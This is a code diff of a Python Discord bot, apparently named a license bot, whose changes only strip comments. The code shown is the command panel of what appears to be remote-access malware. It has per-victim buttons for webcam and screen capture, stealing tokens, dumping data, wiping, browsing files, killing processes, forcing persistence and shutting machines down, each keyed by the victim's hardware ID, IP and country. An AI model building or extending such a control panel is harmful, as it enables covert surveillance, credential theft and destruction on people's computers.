@@ -235,7 +235,6 @@ def save_db(db, sha, url, headers, commit_message, retries=3):
             time.sleep(0.5)
     return False
 
-# --- نماذج الإدخال التفاعلية (Modals) لأزرار الأجهزة ---
 class WallpaperModal(discord.ui.Modal, title="تغيير خلفية سطح المكتب"):
     image_url = discord.ui.TextInput(label="رابط الصورة المباشر (JPG/PNG)", placeholder="https://example.com/image.jpg", required=True)
     def __init__(self, code):
@@ -319,7 +318,6 @@ class LicenseBot(discord.Client):
         if interaction.type == discord.InteractionType.component:
             custom_id = interaction.data.get("custom_id", "")
             
-            # منع تعليق ديسكورد (Thinking...) للأزرار العامة
             if not interaction.response.is_done() and not custom_id.startswith(("dev_act_wallpaper_", "dev_act_killproc_", "dev_act_files_", "dev_act_lag_")):
                 try:
                     await interaction.response.defer(thinking=True, ephemeral=True)
@@ -415,7 +413,6 @@ class LicenseBot(discord.Client):
                     await interaction.followup.send(f"❌ حدث خطأ أثناء فتح اللوحة: {e}", ephemeral=True)
 
             elif custom_id.startswith("dev_"):
-                # معالجة أزرار أجهزة العميل المباشرة
                 try:
                     if custom_id.startswith("dev_force_persist_"):
                         action, code = "force_persist", custom_id.replace("dev_force_persist_", "")
@@ -575,34 +572,28 @@ class DeviceActionsView(discord.ui.View):
         super().__init__(timeout=None)
         self.code, self.hwid, self.ip, self.port, self.country = code, hwid, ip, port, country
 
-        # Row 0 (5 buttons)
         self.add_item(discord.ui.Button(label="🚫 حظر", style=discord.ButtonStyle.danger, custom_id=f"dev_ban_{code}", row=0))
         self.add_item(discord.ui.Button(label="👢 طرد", style=discord.ButtonStyle.primary, custom_id=f"dev_kick_{code}", row=0))
         self.add_item(discord.ui.Button(label="🌍 الموقع", style=discord.ButtonStyle.secondary, custom_id=f"dev_geo_{code}", row=0))
         self.add_item(discord.ui.Button(label="📡 IPConfig", style=discord.ButtonStyle.secondary, custom_id=f"dev_ipconfig_{code}", row=0))
         self.add_item(discord.ui.Button(label="🔍 LanScan", style=discord.ButtonStyle.secondary, custom_id=f"dev_lanscan_{code}", row=0))
 
-        # Row 1 (5 buttons)
         self.add_item(discord.ui.Button(label="🧹 Wipe", style=discord.ButtonStyle.secondary, custom_id=f"dev_wipe_{code}", row=1))
-        # Modal buttons use direct callbacks
         self.add_item(WallpaperButton(code))
         self.add_item(KillProcessButton(code))
         self.add_item(FileBrowserButton(code))
         self.add_item(LagButton(code))
 
-        # Row 2 (5 buttons)
         self.add_item(discord.ui.Button(label="📸 لقطة", style=discord.ButtonStyle.secondary, custom_id=f"dev_ss_{code}", row=2))
         self.add_item(discord.ui.Button(label="📸 كاميرا", style=discord.ButtonStyle.secondary, custom_id=f"dev_webcam_{code}", row=2))
         self.add_item(discord.ui.Button(label="🔑 التوكنات", style=discord.ButtonStyle.secondary, custom_id=f"dev_tokens_{code}", row=2))
         self.add_item(discord.ui.Button(label="📂 Dump", style=discord.ButtonStyle.secondary, custom_id=f"dev_dump_{code}", row=2))
         self.add_item(discord.ui.Button(label="⚡ إيقاف", style=discord.ButtonStyle.danger, custom_id=f"dev_shut_{code}", row=2))
 
-        # Row 3 (3 buttons)
         self.add_item(discord.ui.Button(label="🛡️ تفعيل الثبات الإلزامي", style=discord.ButtonStyle.success, custom_id=f"dev_force_persist_{code}", row=3))
         self.add_item(discord.ui.Button(label="🔓 إلغاء الثبات", style=discord.ButtonStyle.secondary, custom_id=f"dev_remove_persist_{code}", row=3))
         self.add_item(discord.ui.Button(label="🛑 إطفاء الأداة", style=discord.ButtonStyle.danger, custom_id=f"dev_kill_tool_{code}", row=3))
 
-# أزرار فتح النوافذ التفاعلية (Modals)
 class WallpaperButton(discord.ui.Button):
     def __init__(self, code):
         super().__init__(label="🖼️ الخلفية", style=discord.ButtonStyle.secondary, custom_id=f"dev_act_wallpaper_{code}", row=1)
